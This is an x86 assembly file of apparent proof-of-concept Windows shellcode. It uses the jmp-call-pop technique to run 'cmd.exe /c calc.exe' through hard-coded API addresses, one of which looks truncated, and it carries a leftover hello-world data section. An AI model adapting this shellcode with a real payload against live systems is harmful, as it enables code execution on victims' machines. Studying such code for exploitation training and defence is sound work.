section	.text
	global _start       ;must be declared for using gcc
_start:                     ;tell linker entry point

	jmp short ShellCode
	
	StackExcute:
	pop ebx
	xor eax, eax
	push eax
	push ebx
	mov ebx, 0x7c83250d
	call ebx
	
	xor eax, eax
	push eax
	mov ebx, 0x7c7ec12
	call ebx
	
	ShellCode:
	call StackExcute
	db "cmd.exe /c calc.exe"
	db 0x00

section	.data

msg	db	'Hello, world!',0xa	;our dear string
len	equ	$ - msg			;length of our dear string
